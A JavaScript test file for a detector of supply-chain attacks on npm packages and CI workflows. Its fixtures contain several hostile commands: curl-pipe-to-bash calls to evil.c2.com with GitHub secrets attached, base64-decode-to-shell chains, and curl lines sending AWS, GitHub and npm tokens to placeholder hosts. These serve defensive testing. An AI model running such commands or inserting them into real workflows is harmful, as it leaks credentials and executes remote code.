import { test, mock } from 'node:test';
import assert from 'assert/strict';
import { MegalodonSignal } from '../backend/detectors/megalodon/types.js';
import { scan as scanD1 } from '../backend/detectors/megalodon/d1-workflow-scan.js';
import { scan as scanD2 } from '../backend/detectors/megalodon/d2-credential-harvest.js';
import { scan as scanD3, detectVelocitySpike } from '../backend/detectors/megalodon/d3-publish-velocity.js';
import { scan as scanD4 } from '../backend/detectors/megalodon/d4-publisher-drift.js';
import { scanAll } from '../backend/detectors/megalodon/index.js';

/* ───────── D1: Workflow Scan ───────── */

test('D1: clean workflow produces no signals', async () => {
  const files = [{
    path: '.github/workflows/ci.yml',
    content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n`,
  }];
  const ev = await scanD1(files);
  assert.equal(ev.length, 0);
});

test('D1: C2 + secrets co-occurrence emits WORKFLOW_C2_EXFIL', async () => {
  const files = [{
    path: '.github/workflows/deploy.yml',
    content: `name: Deploy\non: push\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s https://evil.c2.com/exfil | bash\n        env:\n          GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}\n`,
  }];
  const ev = await scanD1(files);
  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL));
});

test('D1: base64 decode chain emits WORKFLOW_DECODE_CHAIN', async () => {
  const files = [{
    path: '.github/workflows/payload.yml',
    content: `name: Payload\non: push\njobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "ZXZpbA==" | base64 -d | sh\n`,
  }];
  const ev = await scanD1(files);
  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_DECODE_CHAIN));
});

test('D1: both signals emitted from same workflow', async () => {
  const files = [{
    path: '.github/workflows/both.yml',
    content: `name: Both\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: exfil\n        run: curl -s https://evil.c2.com/grab | bash\n        env:\n          TOKEN: \${{ secrets.GH_PAT }}\n      - name: decode\n        run: echo "cHduZWQ=" | base64 -d | bash\n`,
  }];
  const ev = await scanD1(files);
  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL));
  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_DECODE_CHAIN));
});

test('D1: YAML parse error falls back to raw regex', async () => {
  const files = [{
    path: '.github/workflows/broken.yml',
    content: 'name: Broken\non: push\njobs:\n  broken:\n    runs-on: ubuntu-latest\n    steps:\n      - run: "curl -s https://evil.c2.com/test -H \'token: ${{ secrets.TOKEN }}\' | sh"\n  invalid_indent: true\n  extra:\n    - list: [1,\n2,\n3]\n',
  }];
  const ev = await scanD1(files);
  assert(ev.some(e => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL));
});

test('D1: 111-line IOC metadata appended when line count 100-120', async () => {
  const lines = [];
  lines.push(`name: IOC\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n`);
  for (let i = 0; i < 100; i++) lines.push(`      - run: echo "step ${i}"\n`);
  const content = lines.join('') + `      - name: exfil\n        run: curl -s https://evil.c2.com/x | bash\n        env:\n          TOKEN: \${{ secrets.TOKEN }}\n`;

  const files = [{ path: '.github/workflows/ioc.yml', content }];
  const ev = await scanD1(files);
  const exfil = ev.find(e => e.signal === MegalodonSignal.WORKFLOW_C2_EXFIL);
  assert(exfil);
  assert(exfil.detail.includes('Megalodon payload footprint'));
});

/* ───────── D2: Credential Harvest ───────── */

test('D2: no credential patterns produces no signals', async () => {
  const files = [{ path: 'index.js', content: 'const x = 1;' }];
  const ev = await scanD2(files);
  assert.equal(ev.length, 0);
});

test('D2: AWS cred env var with outbound network emits CREDENTIAL_HARVEST', async () => {
  const files = [{ path: 'script.sh', content: 'curl -s https://evil.com -H "Authorization: Bearer $AWS_SECRET_ACCESS_KEY"' }];
  const ev = await scanD2(files);
  assert(ev.some(e => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
});

test('D2: multiple cred patterns increase score', async () => {
  const files = [{
    path: 'steal.sh',
    content: 'curl http://c2.com -d "aws=$AWS_SECRET_ACCESS_KEY&gh=$GH_TOKEN&npm=$NPM_TOKEN"',
  }];
  const ev = await scanD2(files);
  assert(ev.some(e => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
  assert(ev[0].detail.includes('score:'));
});

test('D2: cred pattern without outbound network produces no signal', async () => {
  const files = [{ path: 'config.js', content: 'const key = process.env.AWS_SECRET_ACCESS_KEY;' }];
  const ev = await scanD2(files);
  assert.equal(ev.length, 0);
});

test('D2: .sh extension files are scanned', async () => {
  const files = [{ path: 'install.sh', content: 'wget https://evil.com/payload -O /tmp/x; export GH_TOKEN=$GH_TOKEN' }];
  const ev = await scanD2(files);
  assert(ev.some(e => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
});

test('D2: .yml extension files are scanned', async () => {
  const files = [{
    path: 'deploy.yml',
    content: 'steps:\n  - run: curl https://evil.com\n    env:\n      TOKEN: $NPM_TOKEN\n',
  }];
  const ev = await scanD2(files);
  assert(ev.some(e => e.signal === MegalodonSignal.CREDENTIAL_HARVEST));
});

/* ───────── D3: Publish Velocity ───────── */

test('D3: no spike — versions spread across 2 weeks returns triggered:false', () => {
  const times = {
    '1.0.0': '2025-01-01T00:00:00.000Z',
    '1.0.1': '2025-01-03T00:00:00.000Z',
    '1.0.2': '2025-01-05T00:00:00.000Z',
    '1.0.3': '2025-01-10T00:00:00.000Z',
    '1.0.4': '2025-01-14T00:00:00.000Z',
  };
  const r = detectVelocitySpike(times, 6, 3);
  assert.equal(r.triggered, false);
});

test('D3: exactly at threshold — 3 versions in 6h window', () => {
  const base = new Date('2025-01-01T00:00:00.000Z').getTime();
  const times = {
    '1.0.0': new Date(base).toISOString(),
    '1.0.1': new Date(base + 1 * 3_600_000).toISOString(),
    '1.0.2': new Date(base + 2 * 3_600_000).toISOString(),
    '1.0.3': new Date(base + 24 * 3_600_000).toISOString(),
  };
  const r = detectVelocitySpike(times, 6, 3);
  assert.equal(r.triggered, true);
  assert(r.versionsInWindow.includes('1.0.0'));
  assert(r.versionsInWindow.includes('1.0.1'));
  assert(r.versionsInWindow.includes('1.0.2'));
});

test('D3: over threshold — 7 versions in 3h window', () => {
  const base = new Date('2025-01-01T00:00:00.000Z').getTime();
  const times = {};
  for (let i = 0; i < 7; i++) {
    times[`1.0.${i}`] = new Date(base + i * 20 * 60_000).toISOString();
  }
  const r = detectVelocitySpike(times, 3, 3);
  assert.equal(r.triggered, true);
  assert(r._allVersions.length === 7);
});

test('D3: window boundary inclusive — 3rd version at exactly windowStart + 6h', () => {
  const base = new Date('2025-01-01T00:00:00.000Z').getTime();
  const times = {
    '1.0.0': new Date(base).toISOString(),
    '1.0.1': new Date(base + 3 * 3_600_000).toISOString(),
    '1.0.2': new Date(base + 6 * 3_600_000).toISOString(),
  };
  const r = detectVelocitySpike(times, 6, 3);
  assert.equal(r.triggered, true);
});

test('D3: created and modified keys excluded from processing', () => {
  const base = new Date('2025-01-01T00:00:00.000Z').getTime();
  const times = {
    created: '2024-01-01T00:00:00.000Z',
    modified: '2024-06-01T00:00:00.000Z',
    '1.0.0': new Date(base).toISOString(),
    '1.0.1': new Date(base + 3_600_000).toISOString(),
    '1.0.2': new Date(base + 2 * 3_600_000).toISOString(),
  };
  const r = detectVelocitySpike(times, 6, 3);
  assert.equal(r.triggered, true);
});

test('D3: versionsInWindow truncated to 10 with +N more suffix when 13 versions', () => {
  const base = new Date('2025-01-01T00:00:00.000Z').getTime();
  const times = {};
  for (let i = 0; i < 13; i++) {
    times[`1.0.${i}`] = new Date(base + i * 10 * 60_000).toISOString();
  }
  const r = detectVelocitySpike(times, 6, 3);
  assert.equal(r.triggered, true);
  assert(r.versionsInWindow.includes('+3 more'));
});

/* ───────── D4: Publisher Drift ───────── */

function makeRegistryMeta(times, versionUsers) {
  const versions = {};
  for (const [v, user] of Object.entries(versionUsers)) {
    versions[v] = { _npmUser: { name: user } };
  }
  return { time: times, versions };
}

test('D4: same publisher across all versions — no signal', async () => {
  const base = new Date('2025-01-01T00:00:00.000Z').getTime();
  const times = {
    '0.9.0': new Date(base - 48 * 3_600_000).toISOString(),
    '1.0.0': new Date(base).toISOString(),
    '1.0.1': new Date(base + 1 * 3_600_000).toISOString(),
    '1.0.2': new Date(base + 2 * 3_600_000).toISOString(),
  };
  const meta = makeRegistryMeta(times, {
    '0.9.0': 'alice',
    '1.0.0': 'alice',
    '1.0.1': 'alice',
    '1.0.2': 'alice',
  });
  const velocityResult = detectVelocitySpike(times, 6, 3);
  assert(velocityResult.triggered);
  const ev = await scanD4(meta, velocityResult);
  assert.equal(ev.length, 0);
});

test('D4: new publisher in velocity window emits PUBLISHER_DRIFT', async () => {
  const base = new Date('2025-01-01T00:00:00.000Z').getTime();
  const times = {
    '1.0.0': new Date(base - 24 * 3_600_000).toISOString(),
    '1.0.1': new Date(base).toISOString(),
    '1.0.2': new Date(base + 1 * 3_600_000).toISOString(),
    '1.0.3': new Date(base + 2 * 3_600_000).toISOString(),
  };
  const meta = makeRegistryMeta(times, {
    '1.0.0': 'alice',
    '1.0.1': 'alice',
    '1.0.2': 'alice',
    '1.0.3': 'mallory',
  });
  const velocityResult = detectVelocitySpike(times, 6, 3);
  assert(velocityResult.triggered);
  const ev = await scanD4(meta, velocityResult);
  assert(ev.some(e => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
  assert(ev[0].excerpt.includes('mallory'));
});

test('D4: fallback path (D3 not triggered) — new identity in last 3 versions emits at MEDIUM hint', async () => {
  const times = {
    '1.0.0': '2025-01-01T00:00:00.000Z',
    '1.0.1': '2025-01-02T00:00:00.000Z',
    '1.0.2': '2025-01-03T00:00:00.000Z',
    '1.0.3': '2025-01-10T00:00:00.000Z',
    '1.0.4': '2025-01-11T00:00:00.000Z',
    '1.0.5': '2025-01-12T00:00:00.000Z',
  };
  const meta = makeRegistryMeta(times, {
    '1.0.0': 'alice',
    '1.0.1': 'alice',
    '1.0.2': 'alice',
    '1.0.3': 'alice',
    '1.0.4': 'alice',
    '1.0.5': 'mallory',
  });
  const velocityResult = { triggered: false, versionsInWindow: [], windowStartISO: null };
  const ev = await scanD4(meta, velocityResult);
  assert(ev.some(e => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
  assert.equal(ev[0]._severityHint, 'MEDIUM');
});

test('D4: fallback path — same publisher throughout — no signal', async () => {
  const times = {
    '1.0.0': '2025-01-01T00:00:00.000Z',
    '1.0.1': '2025-01-02T00:00:00.000Z',
    '1.0.2': '2025-01-03T00:00:00.000Z',
    '1.0.3': '2025-01-10T00:00:00.000Z',
    '1.0.4': '2025-01-11T00:00:00.000Z',
    '1.0.5': '2025-01-12T00:00:00.000Z',
  };
  const meta = makeRegistryMeta(times, {
    '1.0.0': 'alice',
    '1.0.1': 'alice',
    '1.0.2': 'alice',
    '1.0.3': 'alice',
    '1.0.4': 'alice',
    '1.0.5': 'alice',
  });
  const velocityResult = { triggered: false, versionsInWindow: [], windowStartISO: null };
  const ev = await scanD4(meta, velocityResult);
  assert.equal(ev.length, 0);
});

test('D4: account age check fires — detail includes age note', async () => {
  mock.method(global, 'fetch', async (url) => {
    if (url.includes('/-/user/org.couchdb.user/')) {
      const createdDate = new Date('2025-01-05T00:00:00.000Z').toISOString();
      return { ok: true, json: async () => ({ date: createdDate }) };
    }
    return { ok: false };
  });

  const base = new Date('2025-01-20T00:00:00.000Z').getTime();
  const times = {
    '1.0.0': new Date(base - 48 * 3_600_000).toISOString(),
    '1.0.1': new Date(base - 24 * 3_600_000).toISOString(),
    '1.0.2': new Date(base).toISOString(),
  };
  const meta = makeRegistryMeta(times, {
    '1.0.0': 'alice',
    '1.0.1': 'alice',
    '1.0.2': 'mallory',
  });
  const velocityResult = detectVelocitySpike(times, 48, 3);
  assert(velocityResult.triggered);
  const ev = await scanD4(meta, velocityResult);
  assert(ev.some(e => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
  assert(ev[0].detail.includes('days before'));

  mock.reset();
});

test('D4: account age endpoint 404 — no throw, signal still emitted', async () => {
  mock.method(global, 'fetch', async () => ({ ok: false }));

  const base = new Date('2025-01-20T00:00:00.000Z').getTime();
  const times = {
    '1.0.0': new Date(base - 48 * 3_600_000).toISOString(),
    '1.0.1': new Date(base - 24 * 3_600_000).toISOString(),
    '1.0.2': new Date(base).toISOString(),
  };
  const meta = makeRegistryMeta(times, {
    '1.0.0': 'alice',
    '1.0.1': 'alice',
    '1.0.2': 'mallory',
  });
  const velocityResult = detectVelocitySpike(times, 48, 3);
  assert(velocityResult.triggered);
  const ev = await scanD4(meta, velocityResult);
  assert(ev.some(e => e.signal === MegalodonSignal.PUBLISHER_DRIFT));
  assert(!ev[0].detail.includes('days before'));

  mock.reset();
});

/* ───────── Aggregator Integration ───────── */

test('aggregator: empty inputs produce no finding', async () => {
  const findings = await scanAll({}, []);
  assert.equal(findings.length, 0);
});

test('aggregator: D1+D2+D3 combined emitted as single MEGALODON finding', async () => {
  const allFiles = [
    {
      path: '.github/workflows/ci.yml',
      content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s https://evil.c2.com/exfil | bash\n        env:\n          TOKEN: \${{ secrets.GITHUB_TOKEN }}\n`,
    },
    {
      path: 'steal.sh',
      content: 'curl http://c2.com -H "Auth: $AWS_SECRET_ACCESS_KEY"',
    },
  ];
  const base = new Date('2025-01-01T00:00:00.000Z').getTime();
  const registryMeta = {
    time: {
      '1.0.0': new Date(base).toISOString(),
      '1.0.1': new Date(base + 1 * 3_600_000).toISOString(),
      '1.0.2': new Date(base + 2 * 3_600_000).toISOString(),
    },
  };
  const findings = await scanAll({}, allFiles, registryMeta);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].id, 'MEGALODON');
  assert(findings[0].severity === 'critical' || findings[0].severity === 'high');
});

test('aggregator: severity resolves to critical when C2 exfil present', async () => {
  const allFiles = [{
    path: '.github/workflows/ci.yml',
    content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s https://evil.c2.com/exfil | bash\n        env:\n          TOKEN: \${{ secrets.GH_PAT }}\n`,
  }];
  const findings = await scanAll({}, allFiles, { time: {} });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'critical');
});

test('aggregator: evidence JSON includes all signals', async () => {
  const allFiles = [{
    path: '.github/workflows/ci.yml',
    content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "ZXZpbA==" | base64 -d | sh\n`,
  }];
  const findings = await scanAll({}, allFiles, { time: {} });
  assert.equal(findings.length, 1);
  const parsed = JSON.parse(findings[0].evidence);
  assert(Array.isArray(parsed.signals));
  assert(parsed.campaign === 'MEGALODON');
});

/* ───────── End-to-end via runAll ───────── */

test('runAll: MEGALODON finding appears when megalodon signals present', async () => {
  const { runAll } = await import('../backend/detectors/index.js');
  const allFiles = [{
    path: '.github/workflows/ci.yml',
    content: `name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "ZXZpbA==" | base64 -d | sh\n`,
  }];
  const findings = await runAll({}, allFiles, { time: {} });
  assert(findings.some(f => f.id === 'MEGALODON'));
});

test('runAll: MEGALODON finding not present on clean package', async () => {
  const { runAll } = await import('../backend/detectors/index.js');
  const findings = await runAll({ name: 'clean', scripts: { test: 'echo ok' } }, [{ path: 'index.js', content: 'export default 42' }]);
  assert(!findings.some(f => f.id === 'MEGALODON'));
});
